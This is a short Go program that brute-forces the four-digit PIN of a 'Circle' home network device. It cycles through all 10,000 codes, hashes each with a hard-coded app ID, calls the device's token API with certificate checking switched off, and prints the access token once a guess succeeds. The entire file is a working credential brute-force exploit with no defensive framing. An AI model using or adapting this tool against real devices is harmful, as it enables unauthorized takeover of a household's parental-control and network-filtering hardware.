package main

import (
	"crypto/sha1"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

type Result struct {
	Result string
	Error  string
	Token  string
}

const APPID = "HackMyCircleDevice99" // min length: 20

func main() {

	if len(os.Args) < 2 {
		fmt.Printf("usage: %v: <circle-ip-address>\n", os.Args[0])
		os.Exit(1)
	}

	ipAddress := os.Args[1]
	fmt.Printf("using ip address: %v\n", ipAddress)

	for x := 0; x <= 9999; x++ {
		pincode := fmt.Sprintf("%04d", x)
		// show some progress
		if ((x % 10) == 0) {
			fmt.Printf("PINCODE: %v\n", pincode)
		}
		h := sha1.New()
		h.Write([]byte(APPID + pincode))
		hash := fmt.Sprintf("%x", h.Sum(nil))
//		fmt.Println(hash)
		// NOTE: the following line doesn't work because the Circle device
		// doesn't have a certificate.  so, use an insecure connection instead
//		res, err := http.Get("https://" + ipAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{Transport: tr}
		res, err := client.Get("https://" + ipAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
		if err != nil {
			fmt.Println(err.Error())
			os.Exit(1)
		}
		// test url
		//res, err := http.Get("http://" + ipAddress + ":8000")
		defer res.Body.Close()
		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			fmt.Println(err.Error())
			os.Exit(2)
		}
		data := map[string]interface{}{}
		json.Unmarshal(body, &data)
		//fmt.Println(data)
		if data["result"] == "success" {
			fmt.Printf("APPID  : %v\nPINCODE: %v\nTOKEN  : %v\n", APPID, pincode, data["token"])
			break
		} else {
			if data["error"] == "token request failure - invalid app id" {
				fmt.Println("Invalid APPID" + APPID)
				os.Exit(3)
			}
		}
	}

	os.Exit(0)
}
